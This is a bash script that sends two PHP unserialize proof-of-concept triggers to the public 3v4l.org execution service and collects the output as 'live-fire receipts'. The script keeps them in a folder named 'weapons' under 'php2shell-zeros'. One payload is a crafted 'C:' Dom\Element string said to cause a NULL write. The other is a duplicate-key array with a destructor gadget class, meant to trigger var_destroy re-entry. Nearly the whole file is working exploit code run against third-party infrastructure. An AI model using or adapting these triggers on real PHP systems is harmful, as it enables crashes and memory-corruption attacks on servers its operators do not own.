#!/bin/bash
# 3v4l.org live-fire receipts (their vanilla PHP builds, third-party infra):
#  1. C: crasher (zero7): C:11:"Dom\Element" + classList read -> NULL write
#  2. zero4 var_destroy re-entry trigger (with in-code gadget class)
set -u
OUT=/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/receipts
VER=8.5.11

run3v4l() {
  local label="$1"; local code="$2"
  local resp
  resp=$(curl -s --max-time 90 -X POST 'https://3v4l.org/new' \
    -H 'Accept: application/json' \
    --form-string "code=$code" --form-string "version=$VER")
  echo "== $label =="
  echo "$resp" | python3 -c '
import json, sys
try:
    d = json.load(sys.stdin)
except Exception:
    print("(unparseable)"); raise SystemExit
for tab in d.get("output", []):
    print("versions:", tab.get("versions"))
    print("output  :", repr(tab.get("output"))[:600])
if d.get("exception"):
    print("exception:", d["exception"].get("message"))
'
  echo
}

# 1. C: crasher — the C:-format incomplete-object guard never left master
run3v4l "C:-crasher Dom\\Element classList (zero7)" \
'<?php
$el = unserialize("C:11:\"Dom\\Element\":0:{}");
var_dump($el->classList);
echo "SURVIVED\n";'

# 2. zero4 var_destroy re-entry trigger (1020-element dup-key, in-code gadget)
run3v4l "zero4 var_destroy re-entry trigger" \
'<?php
class AppCacheFlusher { public function __destruct() { unserialize("i:1;"); } }
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = "i:9998;O:15:\"AppCacheFlusher\":0:{}";
$els[] = "i:9998;i:5;";
$r = unserialize("a:1020:{" . implode("", $els) . "}");
echo "outer ok=", var_export($r !== false, true), "\n";
echo "SCRIPT-END\n";'
